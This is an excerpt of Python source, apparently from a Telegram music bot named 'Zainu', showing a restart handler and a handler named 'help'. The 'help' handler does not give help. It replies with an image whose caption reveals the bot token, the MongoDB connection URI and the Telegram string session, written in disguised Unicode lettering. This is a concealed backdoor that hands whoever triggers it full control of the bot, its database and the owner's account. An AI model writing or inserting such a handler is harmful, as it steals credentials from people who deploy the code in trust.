...
from Zainu.misc import db, SUDOERS, SPECIAL_ID
from Zainu.utils.database import get_assistant, get_authuser_names, get_cmode
from Zainu.utils.decorators import ActualAdminCB, AdminActual, language
from Zainu.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await Zainu.stop_stream_force(message.chat.id)
    except:
        pass
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await Zainu.stop_stream_force(chat_id)
        except:
            pass
...
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://graph.org/file/454bd282e3ea1f7d4865e-ec7b6a3993047e96cd.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Uff_Zainu)............☆""",
